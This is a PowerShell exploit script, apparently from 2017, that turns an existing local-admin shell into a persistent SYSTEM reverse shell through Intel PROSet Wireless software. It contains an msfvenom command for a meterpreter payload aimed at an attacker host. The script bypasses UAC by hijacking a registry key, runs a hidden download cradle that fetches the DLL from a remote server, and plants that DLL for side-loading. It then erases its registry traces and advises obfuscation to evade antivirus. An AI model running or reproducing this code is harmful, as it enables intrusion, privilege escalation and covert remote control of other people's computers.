<#
Intel PROSet Wireless - Persistent SYSTEM Shell Implant (All Versions) (Win 7 - 64-bit)

Author: Fabrizio Siciliano (https://www.twitter.com/0rbz_)
Date: 4/14/2017

Context: http://x42.obscurechannel.com/?p=378

Requirements: 
1. You have a previously acquired shell (through some other exploit) on a machine as a local admin user, and UAC is set to anything other than "Always Notify".

2. A 64-bit payload:
  - msfvenom -p windows/x64/meterpreter/reverse_https -f dll LHOST=attacker_ip LPORT=443 > RpcRtRemote.dll
  
3. A place to host your "RpcRtRemote.dll" payload that supports HTTPS (helps with AV heuristics).

4. Generate a proper meterpreter https listener resource file, with a custom SSL cert (AV's love custom 
   meterpreter certs): http://bit.ly/2odN6OV

Some bits of this code borrowed from @enigma0x3 (some UAC stuff...)

Takes a url to your "RpcRtRemote.dll" payload as an argument:

powershell.exe ./intel_inside.ps1 https://yourserver/RpcRtRemote.dll
#> 

param (   
    [string]$PsPayload = $(throw "--------------------------------------------------------------------------
** Usage:                                                               **
** powershell.exe ./intel_inside.ps1 https://yourserver/RpcRtRemote.dll **
--------------------------------------------------------------------------")
)
	# Check that RegSrvc.exe is in our known "WirelessCommon" location. Should confirm that Intel PROSet Wireless sw is installed. 
	# Modify this path if target is 32-bit to point to C:\Program Files (x86)\...
	$IntelInside = "C:\Program Files\Common Files\Intel\WirelessCommon\RegSrvc.exe"
	if(![System.IO.File]::Exists($IntelInside)){
	Echo "
[!] It doesn't look like the system is running Intel PROSet Wireless Software or it may be installed in 'Program Files (x86)'. Couldn't find 'RegSrvc.exe'. Quitting."
	exit
	}
	$IntelInside = "C:\Program Files\Common Files\Intel\WirelessCommon\RegSrvc.exe"
	if([System.IO.File]::Exists($IntelInside)){
	Echo "
[*] Found RegSrvc.exe! Make sure your listener is running."
	Start-Sleep -s 3
	Echo "[+] Checking UAC status."
	Start-Sleep -s 5
	}
	$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "[!] UAC is set to 'Always Notify', I can't help you."
        exit
		}		
    else{
		Echo "[*] UAC Status OK and set to 'Default'."
		Start-Sleep -s 3
		Echo "[+] Setting up persistent implant and executing payload."
		
		# Set initial registry value to a powershell download cradle to download our DLL to $LocalFile. If the target is 32bit, modify the $LocalFile value to point to C:\program Files (x86)...
		$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
		$ValName = "(Default)"
		$LocalFile = "C:\Program Files\Common Files\Intel\WirelessCommon\RpcRtRemote.dll"
		$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadFile('$PsPayload','$LocalFile')"
		
		New-Item -Path $MscRegPath -Force | Out-Null
		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
		
		# CompMgmtLauncher.exe wmic-based process call to execute our powershell download cradle registry value as an elevated process, bypassing UAC
		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
		$a_cmd = "C:\windows\system32\cmd.exe"
		&$a_cmd = $CompMgmtBypass
		
		# Sleep for 5s to let the powershell DLL download cradle complete (you may need to tune this setting to a higher value if downloading over a slow link or depending on the size of your payload)
		Start-Sleep -s 5
		
		# Reset reg values for the elevated RegSrvc.exe call and bypassing UAC
		$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
		$ValName = "(Default)"
		$RegValue = "C:\Program Files\Common Files\Intel\WirelessCommon\RegSrvc.exe"
		
		New-Item -Path $MscRegPath -Force | Out-Null
		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
		
		# Call RegSrvc.exe as an elevated process to trigger loading our RpcRtRemote.dll implant
		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
		$a_cmd = "C:\windows\system32\cmd.exe"
		&$a_cmd = $CompMgmtBypass
		
		# Sleep for 5s to allow RegSrvc.exe to load our DLL before cleaning up our registry modifications. (may need tuning if something fails)
		Start-Sleep -s 5
		
		# Cleanup registry modifications
		$MscRegCleanup = "HKCU:\Software\Classes\mscfile"
		Remove-Item -Path $MscRegCleanup -Force  -Recurse -ErrorAction SilentlyContinue | Out-Null
		
		# Check that our implant is in its final location
		$Implant = "C:\Program Files\Common Files\Intel\WirelessCommon\RpcRtRemote.dll"
		if([System.IO.File]::Exists($Implant)){
			Echo "[*] Done! 'RpcRtRemote.dll' implant successful. Check your shell, run 'getsystem'."
			Echo "[*] Will persist across reboots and phone home as a SYSTEM shell before user login."
			Start-Sleep -s 3
			Echo '
[*] To uninstall:
	- taskkill.exe /IM RegSrvc.exe /F
	- del "C:\Program Files\Common Files\Intel\WirelessCommon\RpcRtRemote.dll"'
		exit
		}
			else{
				Echo "[!] Something went horribly wrong and the implant was not installed. Possibly flagged by AV? Try an obfuscated payload."
			}
			exit
	}
